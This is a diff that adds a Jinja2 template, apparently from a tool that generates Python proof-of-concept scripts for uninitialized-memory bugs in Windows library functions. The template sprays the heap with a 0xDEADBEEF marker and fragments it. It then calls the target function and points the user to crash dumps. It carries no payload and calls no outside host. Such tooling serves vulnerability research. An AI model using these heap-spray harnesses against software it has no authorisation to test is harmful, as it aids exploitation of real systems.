@@ -1,0 +1,105 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Uninitialized memory usage{% endblock %}
+
+{% block config %}
+# 函数签名信息
+ARG_COUNT = {{ arg_count or 0 }}
+{% if args_info %}
+ARGS_INFO = {{ args_info }}
+{% else %}
+ARGS_INFO = []
+{% endif %}
+{% endblock %}
+
+{% block payload %}
+# No specific payload - relies on memory state
+payload = b''
+
+# Heap spray pattern for leak detection
+SPRAY_PATTERN = 0xDEADBEEF
+SPRAY_SIZE = 256
+SPRAY_COUNT = 250
+{% endblock %}
+
+{% block exploit_doc %}Trigger uninitialized memory usage{% endblock %}
+
+{% block exploit_body %}
+        # Spray heap with marker pattern before call
+        msvcrt = ctypes.CDLL("msvcrt")
+        malloc = msvcrt.malloc
+        malloc.restype = ctypes.c_void_p
+        free = msvcrt.free
+        free.argtypes = [ctypes.c_void_p]
+
+        sprayed_ptrs = []
+        for _ in range(SPRAY_COUNT):
+            ptr = malloc(SPRAY_SIZE)
+            if ptr:
+                # 使用 DEADBEEF 模式填充，便于检测泄露
+                pattern = (SPRAY_PATTERN).to_bytes(4, 'little') * (SPRAY_SIZE // 4)
+                ctypes.memmove(ptr, pattern, SPRAY_SIZE)
+                sprayed_ptrs.append(ptr)
+
+        # 释放一半，创建碎片化的堆
+        for ptr in sprayed_ptrs[::2]:
+            free(ctypes.c_void_p(ptr))
+
+        print(f"[*] Heap sprayed with {SPRAY_COUNT} allocations")
+        print("[*] Creating uninitialized memory conditions")
+
+        # 为指针参数分配有效内存
+        buffers = []
+        for i in range(max({{ arg_count or 4 }}, 4)):
+            buf = ctypes.create_string_buffer(1024)
+            buffers.append(buf)
+
+        def build_args():
+            """构建函数调用参数"""
+            args = []
+{% if args_info %}
+            # 使用签名信息构建参数
+            for i, arg_info in enumerate(ARGS_INFO):
+                is_ptr = arg_info.get('is_pointer', False) or '*' in arg_info.get('type', '')
+                if is_ptr:
+                    # 指针参数 - 传递有效缓冲区
+                    args.append(ctypes.cast(buffers[i % len(buffers)], ctypes.c_void_p))
+                else:
+                    # 整数参数
+                    args.append(ctypes.c_int64(0))
+{% elif arg_count and arg_count > 0 %}
+            # 没有签名信息但知道参数数量，使用缓冲区作为安全默认值
+            for i in range({{ arg_count }}):
+                args.append(ctypes.cast(buffers[i % len(buffers)], ctypes.c_void_p))
+{% endif %}
+            return args
+
+{% if arg_count and arg_count > 0 %}
+        print(f"[*] Calling {{ func_name }} with potentially uninitialized arguments...")
+        try:
+            args = build_args()
+            result = func(*args)
+            print(f"[+] Function returned: {result}")
+        except OSError as e:
+            print(f"[!] OS Error: {e}")
+            print("[-] PoC execution failed")
+        except Exception as e:
+            print(f"[!] Exception: {type(e).__name__}: {e}")
+{% else %}
+        print("[*] Calling function with no arguments...")
+        try:
+            result = func()
+            print(f"[+] Function returned: {result}")
+        except Exception as e:
+            print(f"[!] Exception: {type(e).__name__}: {e}")
+{% endif %}
+
+        # 清理剩余的 spray
+        for ptr in sprayed_ptrs[1::2]:
+            try:
+                free(ctypes.c_void_p(ptr))
+            except:
+                pass
+
+        print("[+] Completed - check for DEADBEEF (0xEFBEADDE) pattern in crash dumps")
+{% endblock %}
